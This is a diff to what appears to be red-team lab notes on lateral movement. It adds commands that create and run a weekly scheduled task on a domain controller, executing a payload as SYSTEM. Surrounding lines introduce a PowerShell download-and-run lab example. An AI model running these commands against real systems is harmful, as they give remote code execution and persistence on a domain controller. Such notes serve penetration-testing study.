@@ -26,6 +26,13 @@ schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNe
 schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
 ```
 
+For a recurring weekly task, use a valid weekly schedule and specify the day explicitly:
+
+```cmd
+schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
+schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
+```
+
 A task action can also invoke PowerShell directly. The following lab example downloads and runs a script; host the payload only on infrastructure authorized for the assessment:
 
 ```cmd
